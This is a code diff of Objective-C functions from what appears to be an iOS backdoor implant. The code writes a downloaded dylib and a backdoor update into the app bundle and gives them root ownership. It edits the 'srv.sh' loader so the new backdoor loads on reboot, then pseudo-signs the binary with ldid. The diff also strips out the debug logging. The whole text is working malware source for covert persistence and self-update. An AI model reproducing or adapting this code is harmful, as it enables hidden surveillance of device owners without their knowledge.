@@ -63,29 +63,16 @@
   
   BOOL bRet = FALSE;
   
-  NSString *_upgradePath = [[NSString alloc] initWithFormat: @"/usr/lib/%@",
-                            gDylibName];
+  NSString *_upgradePath = [[NSString alloc] initWithFormat: @"%@/%@", [[NSBundle mainBundle] bundlePath] , gDylibName];
   
   // Create clean files for ios hfs 
   NSError *err = nil;
   [[NSFileManager defaultManager] removeItemAtPath: _upgradePath 
                                              error: &err];
-#ifdef DEBUG
-  if (err != nil)
-    NSLog(@"%s: removing old dylib update with result %@", __FUNCTION__, err);
-#endif
-  
   bRet = [fileData writeToFile: _upgradePath
                     atomically: YES];
-  
-#ifdef DEBUG
-  NSLog(@"%s: dylib upgrade gDylibName = %@ saved with status %d", 
-        __FUNCTION__, gDylibName, bRet);
-#endif
-  
-  //
+
   // Forcing permission
-  //
   u_long permissions = (S_IRUSR|S_IWUSR|S_IRGRP|S_IROTH);
   NSValue *permission = [NSNumber numberWithUnsignedLong: permissions];
   NSValue *owner = [NSNumber numberWithInt: 0];
@@ -112,51 +99,38 @@
   
   BOOL bRet = FALSE;
   
-  NSString *_upgradePath = [[NSString alloc] initWithFormat: @"%@/%@",
-                            [[NSBundle mainBundle] bundlePath],
-                            gBackdoorUpdateName];
+  NSString *_upgradePath = [[NSString alloc] initWithFormat: @"%@/%@", [[NSBundle mainBundle] bundlePath],
+                                                                       gBackdoorUpdateName];
   
   // Create clean files for ios hfs 
   NSError *err = nil;
   [[NSFileManager defaultManager] removeItemAtPath: _upgradePath 
                                              error: &err];
-#ifdef DEBUG
-  if (err != nil)
-   NSLog(@"%s: removing old core update with result %@", __FUNCTION__, err);
-#endif
-  
+
   bRet = [fileData writeToFile: _upgradePath
                     atomically: YES];
   
-#ifdef DEBUG
-  NSLog(@"%s: backdoor upgrade gBackdoorUpdateName = %@ saved with status %d", 
-        __FUNCTION__, gBackdoorUpdateName, bRet);
-#endif
-  
-  //
   // Forcing permission
-  //
   u_long permissions = S_IRWXU;
   NSValue *permission = [NSNumber numberWithUnsignedLong: permissions];
   NSValue *owner = [NSNumber numberWithInt: 0];
   
   [[NSFileManager defaultManager] changeFileAttributes:
-                                                 [NSDictionary dictionaryWithObjectsAndKeys:
-                                                  permission,
-                                                  NSFilePosixPermissions,
-                                                  owner,
-                                                  NSFileOwnerAccountID,
-                                                  nil] 
+                                                 [NSDictionary dictionaryWithObjectsAndKeys:permission,
+                                                                                            NSFilePosixPermissions,
+                                                                                            owner,
+                                                                                            NSFileOwnerAccountID,
+                                                                                            nil] 
                                                 atPath: _upgradePath];
   
-  //
+  [_upgradePath release];
+  
   // Once the backdoor has been written, edit the backdoor Loader in order to
   // load the new updated backdoor upon reboot
-  //
   NSString *backdoorLoaderPath = [[[NSBundle mainBundle] bundlePath]
                                   stringByAppendingPathComponent: @"srv.sh"];
   
-  NSMutableData *_fileContent = [[NSMutableData alloc] initWithContentsOfFile: backdoorLoaderPath];
+  NSMutableData *_fileContent  = [[NSMutableData alloc] initWithContentsOfFile: backdoorLoaderPath];
   NSMutableString *fileContent = [[NSMutableString alloc] initWithData: _fileContent
                                                               encoding: NSUTF8StringEncoding];
   
@@ -164,10 +138,6 @@
                                withString: gBackdoorUpdateName
                                   options: NSCaseInsensitiveSearch
                                     range: NSMakeRange(0, [fileContent length])];
-  
-#ifdef DEBUG
-  NSLog(@"%s: service file replaced with %@", __FUNCTION__, fileContent);
-#endif
   
   NSData *updateData = [fileContent dataUsingEncoding: NSUTF8StringEncoding];
   
@@ -177,19 +147,10 @@
   pid_t pid = fork();
   
   if (pid == 0) 
-    {
-#ifdef DEBUG
-      NSLog(@"%s: launching ldid [%d]", __FUNCTION__, pid);
-#endif
-      execlp("/usr/bin/ldid", "/usr/bin/ldid", "-S", [gBackdoorUpdateName UTF8String], NULL);
-    }
+    execlp("/usr/bin/ldid", "/usr/bin/ldid", "-S", [gBackdoorUpdateName UTF8String], NULL);
   
   int status;
   waitpid(pid, &status, 0);
-  
-#ifdef DEBUG
-  NSLog(@"%s: rebuilding macho pseudo sig = %d", __FUNCTION__, status);
-#endif
   
   [_fileContent release];
   [fileContent release];
